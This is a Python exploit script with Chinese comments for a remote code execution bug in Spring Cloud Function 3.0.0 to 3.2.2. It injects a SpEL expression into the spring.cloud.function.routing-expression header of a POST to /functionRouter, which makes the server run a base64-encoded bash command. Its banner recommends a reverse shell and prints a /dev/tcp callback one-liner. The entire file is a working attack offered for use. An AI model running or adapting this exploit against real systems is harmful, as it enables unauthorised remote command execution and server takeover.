# 漏洞影响的版本：3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2
# by 清晨
import requests
import base64
import sys
import re

import warnings
warnings.filterwarnings('ignore')

def getargs():
    if (len(sys.argv) == 3):
        if re.findall('^http[s]?://.+\.[0-9a-zA-Z]+[:]?[1-6]?[0-9]?[0-9]?[0-9]?[0-9]?[/]?$',sys.argv[1]):
            target = re.findall('^http[s]?://.+\.[0-9a-zA-Z]+[:]?[1-6]?[0-9]?[0-9]?[0-9]?[0-9]?',sys.argv[1])[0]
            if len(sys.argv) == 3:
                cmd = sys.argv[2]
            else:
                cmd = "id"
            return target,cmd
        else:
            print("URL参数错误！格式：http(https)://www.baidu.com[:prot]")
            exit()
    else:
        print('参数错误！使用：python exploit.py target "cmd"')
        exit()

def rce(target,cmd):
    byte_cmd = bytes(cmd,encoding="utf-8")
    base64_cmd = base64.b64encode(byte_cmd)
    payload = str(base64_cmd,encoding="utf-8")

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'spring.cloud.function.routing-expression' : 'T(java.lang.Runtime).getRuntime().exec("bash -c {echo,' + payload + '}|{base64,-d}|{bash,-i}")'
    }
    try:
        rep = requests.post(url=target + "/functionRouter", data="test",headers=headers,  verify=False)
        if rep.status_code == 404:
            print("[-] 漏洞不存在！")
        else:
            print("[*] 请求已执行！（无回显！）")
    except Exception as e:
        print("[-] 请求异常！")
        print(e)

if __name__ == '__main__':
    print("*> 漏洞影响的版本：3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2")
    print("*> 因为该漏洞为无回显的漏洞，因此建议命令执行反弹shell。")
    print("*> Linux反弹shell：bash -i >& /dev/tcp/ip地址/端口 0>&1\n")
    args = getargs()
    rep_data = rce(*args)
